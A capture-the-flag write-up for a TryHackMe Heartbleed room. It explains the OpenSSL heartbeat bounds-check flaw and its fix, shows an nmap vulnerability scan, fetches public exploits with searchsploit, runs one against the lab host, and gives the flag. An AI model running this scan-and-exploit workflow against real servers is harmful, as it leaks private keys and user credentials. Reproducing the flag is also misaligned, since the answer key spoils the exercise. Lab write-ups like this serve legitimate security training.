# HeartBleed

SSL issues are still lurking in the wild. Can you exploit this web servers OpenSSL?

[HeartBleed](https://tryhackme.com/room/heartbleed)

## Topic's

- HeartBleed
- CVE-2014-0346 OpenSSL 1.0.1 - 1.0.1f
- CVE-2014-0160 OpenSSL 1.0.1 - 1.0.1f

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Background Information

**Introduction to Heartbleed and SSL/TLS**

On the internet today, most web servers are configured to use SSL/TLS. SSL(secure socket layer) is just a predecessor to [TLS](https://medium.com/sitewards/the-magic-of-tls-x509-and-mutual-authentication-explained-b2162dec4401)(transport layer security). The most common versions are TLS 1.2 and TLS 1.3(which has recently been released). Configuring a web server to use TLS means that all communication from that particular server to a client will be encrypted; any malicious third party that has access to this traffic will not be able to understand/decrypt the traffic, and they also will not be able to modify the traffic. To learn more about how the TLS connections are established, check [1.2](https://tls.ulfheim.net/) and [1.3](https://tls13.ulfheim.net/) out.
Heartbleed is a bug due to the implementation in the OpenSSL library from versions 1.0.1 to 1.0.1f(which is very widely used). It allows a user to access memory on the server(which they usually wouldn't have access to). This in turn allows a malicious user to access different kinds of information(that they wouldn't usually have access to due to the encryption and integrity provided by TLS) including:

- server private key
- confidential data like usernames, passwords and other personal information

**Analysing the Bug**

The implementation error occurs in the heartbeat message that is used by OpenSSL to keep a connection alive even when no data is sent. A mechanism like this is important because if a connection dies/resets quite often, it would be expensive to set up the TLS aspect of the connection again; this affects the latency across the internet and it would make using services slow for users. A heartbeat message sent by one end of the connection contains random data and the length of the data, and this exact data is sent back when received by the other end of the connection. When the server retrieves this message from the client here's what it does:

- The server constructs a pointer(memory location) to the heartbeat record
- It then copies the length of the data sent by a user into a variable(called payload)
  - The length of this data is unchecked
- The server then allocates memory in the form of:
  - 1 + 2 + payload + padding(this can be maximum of 1 + 2 + 65535 + 16)
- The server then creates another pointer(bp) to access this memory
- The server then copies payload number of bytes from data sent by the user to the bp pointer
- The server sends the data contained in the bp pointers to the user

With this, you can see that the user controls the amount and length of data they send over. If the user does not send over any data(where the length is 0), it means that the server will copy arbitrary memory into the new pointer(which is how it can access secret information on the server). When retrieving data this way, the data can be different with different responses as the memory on the server will change.

**Remediation**

To ensure that arbitrary data from the server isn’t copied and sent to a user, the server needs to check the length of the heartbeat message:

- The server needs to check that the length of the heartbeat message sent by the user isn’t 0
- The server needs to check the the length doesn’t exceed the specified length of the variable that holds the data

**References:**

- http://heartbleed.com/
- https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html
- https://stackabuse.com/heartbleed-bug-explained/

1. Read above and ensure you have a good understanding of how the Heartbleed vulnerability works.

`No answer needed`

## Task 2 Protecting Data In Transit

In this task, you need to obtain a flag using a very well known vulnerability. Make sure you pay attention to all the information and errors displayed. Pay particular attention to how web servers are configured.

It may take between 3-4 minutes for the server to deploy and configure. Please be patient.

```
kali@kali:~/CTFs/tryhackme/HeartBleed$ sudo nmap -sS -sC -sV -O --script vuln 34.255.196.87
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 19:23 CEST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for ec2-34-255-196-87.eu-west-1.compute.amazonaws.com (34.255.196.87)
Host is up (0.043s latency).
Not shown: 994 closed ports
PORT    STATE    SERVICE      VERSION
22/tcp  open     ssh          OpenSSH 7.4 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners:
|   cpe:/a:openbsd:openssh:7.4:
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|_      CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
111/tcp open     rpcbind      2-4 (RPC #100000)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33647/tcp6  status
|   100024  1          42833/tcp   status
|   100024  1          52119/udp6  status
|_  100024  1          52143/udp   status
135/tcp filtered msrpc
139/tcp filtered netbios-ssn
443/tcp open     ssl/http     nginx 1.15.7
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: nginx/1.15.7
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192:
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.securityfocus.com/bid/49303
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://seclists.org/fulldisclosure/2011/Aug/175
|_      https://www.tenable.com/plugins/nessus/55976
| ssl-ccs-injection:
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt
|_sslv2-drown:
445/tcp filtered microsoft-ds
Aggressive OS guesses: Linux 3.1 (87%), Linux 3.2 (87%), Linux 3.10 - 3.13 (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Roku 2 XS media player (Linux 2.6.32) (86%), Linux 2.6.32 (86%), Linux 3.1 - 3.2 (86%), Linux 3.11 (86%), Linux 3.2 - 4.9 (86%), Linux 3.5 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 21 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 298.02 seconds
```

```
kali@kali:~/CTFs/tryhackme/HeartBleed$ searchsploit heartbleed
------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                         |  Path
------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)    | multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                    | multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                     | multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                       | multiple/remote/32745.py
------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
kali@kali:~/CTFs/tryhackme/HeartBleed$ searchsploit -m 32764 32791 32998 32745
  Exploit: OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)
      URL: https://www.exploit-db.com/exploits/32764
     Path: /usr/share/exploitdb/exploits/multiple/remote/32764.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/CTFs/tryhackme/HeartBleed/32764.py


  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)
      URL: https://www.exploit-db.com/exploits/32791
     Path: /usr/share/exploitdb/exploits/multiple/remote/32791.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /home/kali/CTFs/tryhackme/HeartBleed/32791.c


  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)
      URL: https://www.exploit-db.com/exploits/32998
     Path: /usr/share/exploitdb/exploits/multiple/remote/32998.c
File Type: ASCII text, with CRLF line terminators

Copied to: /home/kali/CTFs/tryhackme/HeartBleed/32998.c


  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure
      URL: https://www.exploit-db.com/exploits/32745
     Path: /usr/share/exploitdb/exploits/multiple/remote/32745.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/CTFs/tryhackme/HeartBleed/32745.py


kali@kali:~/CTFs/tryhackme/HeartBleed$ python 32745.py 34.240.13.68 > 32745result.txt
```

1. What is the flag?

`THM{sSl-Is-BaD}`
